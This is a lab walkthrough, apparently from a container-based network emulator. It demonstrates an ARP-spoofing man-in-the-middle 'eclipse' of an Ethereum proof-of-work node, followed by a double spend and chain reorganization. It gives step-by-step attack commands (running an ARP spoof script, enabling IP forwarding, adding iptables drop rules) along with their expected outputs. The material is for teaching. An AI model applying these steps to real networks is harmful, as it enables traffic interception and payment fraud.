# Layer 2: ARP Spoofing Eclipse Attack

This module executes a localized Man-in-the-Middle (MitM) attack to isolate the victim node.

## Phase 1: The Eclipse Attack (Isolation)

> **Automation Alternative:** To execute the automated attack sequence instead of entering the step-by-step terminal commands below, ensure your environment is initialized (`docker-compose up -d`) and run [`python3 arp_eclipse_attack.py`](arp_eclipse_attack.py) from the Host VM.

> **Important Pre-Attack Check:** Before launching the attack, ensure that all nodes are actively mining and that block heights are increasing globally. This can be verified using the **Check Current Block Heights** diagnostic block in the [Master README Appendix](../README.md#diagnostics). Execute it sequentially to confirm the block numbers are rising before proceeding.

> **Attacker tooling note:** the AS160 host used as attacker (`as160h-host_1-10.160.0.72`) ships without `scapy`. Install it once before running the attack: `docker exec as160h-host_1-10.160.0.72 pip3 install scapy` (or bake `python3-scapy` into the host image).

We utilize the Attacker Node (`.72`) to intercept and discard all peer-to-peer communication to and from the Victim Node (`.71`), effectively partitioning it from the consensus network.

* **Methodology:** [`arp_spoof.py`](arp_spoof.py) executes a Man-in-the-Middle (MitM) attack. It falsifies ARP resolution, deceiving the victim node into mapping the gateway IP to the attacker's MAC address, and similarly deceiving the router. This forces all traffic to route through the attacker's machine.

**1. Copy the ARP Spoof script to the Attacker container (From Host VM):**
```bash
docker cp arp_spoof.py as160h-host_1-10.160.0.72:/tmp/arp_spoof.py
```

**2. Open a terminal inside the Attacker Node:**
```bash
docker exec -it as160h-host_1-10.160.0.72 /bin/bash
```

**3. Reroute Traffic and Drop Packets (Inside Attacker Node):**
First, enable IP forwarding and start the ARP spoofing process to route `.71`'s traffic through the attacker node.

```bash
sysctl -w net.ipv4.ip_forward=1
python3 /tmp/arp_spoof.py &
```
Next, implement `iptables` rules to drop all TCP and UDP traffic, effectively severing `.71`'s Ethereum P2P connections:
```bash
iptables -A FORWARD -s 10.160.0.71 -p tcp -j REJECT --reject-with tcp-reset
iptables -A FORWARD -d 10.160.0.71 -p tcp -j REJECT --reject-with tcp-reset
iptables -A FORWARD -s 10.160.0.71 -p udp -j DROP
iptables -A FORWARD -d 10.160.0.71 -p udp -j DROP
```

**4. Verify the Eclipse (From Host VM):**
```bash
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "admin.peers.length"
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 ip neigh
```
> **Expected Output:** `admin.peers.length` should return `0`. The MAC address associated with the router IP will now match the Attacker node's MAC address. Network isolation is confirmed.

---

## Phase 2: The Double Spend Execution

*Note: The network partition is now established. To execute the conflicting transactions and observe the resulting state divergence, proceed to **[Phase 2 in the Master Guide](../README.md#phase-2-the-double-spend)**.*

*Once the account balances have diverged across the network, return to this document to initiate the chain reorganization (Phase 3).*

---

## Phase 3: The Chain Reorganization (The Vanish)

In Proof-of-Work, the chain with the highest total difficulty is accepted as the canonical truth. Because the main network possesses the combined hashing power of two miners (Nodes 161 and 162), it holds a significant statistical advantage. Given sufficient time, the main network's chain will reliably outpace and become heavier than the isolated Victim's chain (Node 160).

**1. Release the Victim (Inside Attacker `.72` Terminal):**
Flush the firewall rules and kill the ARP spoofing script.
```bash
iptables -F
# Press CTRL+C to stop arp_spoof.py
```

**2. Force Network Reconnection (From Host VM):**
Retrieve a healthy node's enode URI and manually peer it with the Victim node.
```bash
# Get a healthy node's Enode (Node 161)
docker exec -it as161h-Ethereum-POW-01-Miner-10.161.0.71 geth attach --exec "admin.nodeInfo.enode"

# Manually add peer to Victim (Replace <ENODE> with the output above, ensuring IP is 10.161.0.71)
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "admin.addPeer('<ENODE>')"
```

**3. Observe the Consensus Resolution:**
Upon reconnection, Node 160 will synchronize with its peers, evaluate the block heights, and recognize its local chain has a lower total difficulty. It will discard its isolated blocks (orphan the 5 ETH transaction) and adopt the canonical chain.

Run the balance check on Node 160 to confirm:
```bash
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec '["0xCBF1e330F0abD5c1ac979CF2B2B874cfD4902E24", "0xF5406927254d2dA7F7c28A61191e3Ff1f2400fe9", "0xaB5AaD8284868B91Eb537d28aB1A159740D54890"].forEach(addr => { console.log(addr + ": " + web3.fromWei(eth.getBalance(addr), "ether") + " ETH") })'
```
> **Final Expected Output (Node 160):**
> Origin: `8.999 ETH`
> Victim: `30 ETH` *(The 5 ETH have vanished!)*
> Bob: `1 ETH` 

The Double Spend exploit is complete. The attacker has successfully retained their funds (now secured by Bob) while the victim's ledger no longer reflects the payment for the released goods.

---
